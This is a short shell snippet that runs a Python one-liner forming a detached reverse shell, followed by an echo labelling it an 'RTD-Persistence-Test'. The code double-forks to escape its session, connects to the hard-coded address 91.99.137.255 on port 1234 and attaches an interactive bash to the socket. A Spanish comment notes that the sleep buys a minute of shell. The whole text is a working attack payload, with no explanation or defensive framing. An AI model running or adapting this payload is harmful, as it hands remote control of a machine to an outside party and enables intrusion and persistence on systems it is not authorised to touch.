    python3 -c 'import os,socket,subprocess,time;
    if os.fork() == 0:
        os.setsid()
        if os.fork() == 0:
            try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
                s.connect(("91.99.137.255",1234));
                os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
                subprocess.call(["/bin/bash","-i"])
            except: pass
    time.sleep(60) # <--- ESTO COMPRA 1 MINUTO DE SHELL
    '
    echo "RTD-Persistence-Test"
